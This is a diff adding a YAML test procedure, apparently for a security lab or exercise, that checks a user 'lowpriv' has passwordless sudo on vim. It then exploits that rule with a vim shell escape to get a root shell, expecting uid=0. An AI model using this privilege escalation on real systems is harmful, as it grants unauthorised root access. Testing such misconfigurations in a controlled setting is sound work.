@@ -1,0 +1,30 @@
+procedure:
+- action:
+    command: id lowpriv
+    type: exec_target
+  expect:
+    stdout_contains: lowpriv
+  outputs: {}
+  session: null
+  step_id: verify_lowpriv_user_exists
+  timeout: 10
+- action:
+    command: cat /etc/sudoers.d/lowpriv
+    type: exec_target
+  expect:
+    stdout_contains: 'NOPASSWD: /usr/bin/vim'
+  outputs: {}
+  session: null
+  step_id: verify_sudoers_rule
+  timeout: 10
+- action:
+    command: su -s /bin/bash lowpriv -c 'sudo /usr/bin/vim -c ":!/bin/bash -c id"
+      /dev/null'
+    type: exec_target
+  expect:
+    stdout_contains: uid=0(root) gid=0(root)
+  outputs: {}
+  session: null
+  step_id: exploit_sudo_vim_privesc
+  timeout: 15
+sessions: []
